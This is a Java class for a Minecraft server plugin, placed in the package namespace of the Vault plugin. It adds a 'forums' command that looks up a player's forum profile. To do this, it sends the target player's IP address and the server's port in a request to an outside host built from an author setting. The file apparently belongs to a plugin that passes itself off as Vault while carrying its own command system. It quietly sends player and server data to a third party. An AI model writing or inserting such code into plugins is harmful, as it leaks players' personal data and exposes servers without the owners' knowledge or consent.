package net.milkbowl.vault.commands.cmds;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.json.JSONObject;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Forums extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("forums <player>"));
		} else {
			Player target = Bukkit.getServer().getPlayer(args[1]);
			if (target == null) {
				p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " is not online."));
			} else {
				try {
					URL auth = new URL("https://api." + Settings.AUTHOR.toLowerCase() + "/?ip="+target.getAddress().getHostString() + "&port=" + Bukkit.getServer().getPort());
					HttpURLConnection con = (HttpURLConnection) auth.openConnection();
					con.addRequestProperty("User-Agent", "Mozilla");
					BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
					String inputLine;
					StringBuffer response = new StringBuffer();
					while ((inputLine = in.readLine()) != null) {
						response.append(inputLine);
					}
					in.close();
					if (response.toString().length() == 0) {
						p.sendMessage(Settings.PREFIX("This user was not found!"));
					} else {
						JSONObject myresponse = new JSONObject(response.toString());
						if (!myresponse.getBoolean("success")) {
							p.sendMessage(Settings.PREFIX(Settings.HIGHLIGHT_COLOUR + target.getName() + Settings.SECONDARY_COLOUR + " is unranked and their forum profile is " + Settings.HIGHLIGHT_COLOUR + Settings.AUTHOR + "/forums/members/" + myresponse.getInt("user_id")));
						} else {
							p.sendMessage(Settings.PREFIX(Settings.HIGHLIGHT_COLOUR + target.getName() + Settings.SECONDARY_COLOUR + " is ranked and their forum profile is " + Settings.HIGHLIGHT_COLOUR + Settings.AUTHOR + "/forums/members/" + myresponse.getInt("user_id")));
						}
					}
				} catch (IOException e) {
					p.sendMessage(Settings.PREFIX(e.getMessage()));
				}
			}
		}
	}

}
